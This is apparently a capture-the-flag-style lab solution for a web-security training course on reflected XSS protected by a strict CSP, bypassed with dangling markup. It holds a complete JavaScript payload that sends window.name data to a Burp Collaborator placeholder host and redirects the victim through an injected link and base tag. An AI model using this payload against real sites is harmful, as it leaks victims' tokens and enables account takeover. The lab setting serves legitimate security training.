# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/5e22876a-1d30-4297-b2c3-9d27ff4fe42f)

## Solution

Log in using the given username and password.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/f90f2474-49c3-4d02-8fd6-cfb71a4fe8f8)

Go to burp collaborator, start it and click on **Copy to clipboard** to get a subdomain.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d7bb04d0-34b5-475b-9643-b93882161a25)

Go to exploit server and in the body give the payload below.

```Javascript
<script>
if(window.name) {
		new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
		} else {
     			location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/61fa211f-64d8-4bd5-86b6-dcff33a900e0)
